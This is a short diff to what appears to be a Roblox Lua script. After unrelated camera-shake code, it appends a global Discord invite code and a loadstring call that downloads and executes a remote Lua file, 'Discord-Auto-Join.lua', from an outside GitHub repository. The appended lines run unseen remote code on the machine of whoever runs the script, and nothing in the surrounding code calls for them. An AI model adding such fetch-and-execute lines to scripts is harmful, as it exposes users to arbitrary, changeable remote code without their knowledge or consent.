@@ -266,3 +266,8 @@ task.spawn(function()
             Player.PlayerScripts:WaitForChild("CameraShake", 1234).Value = CFrame.new(0,0,0) * CFrame.Angles(0,0,0);
         end
     end
+
+
+getgenv().InviteCode = "wSjHbHM9j9"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/Discord-Auto-Join.lua"))()
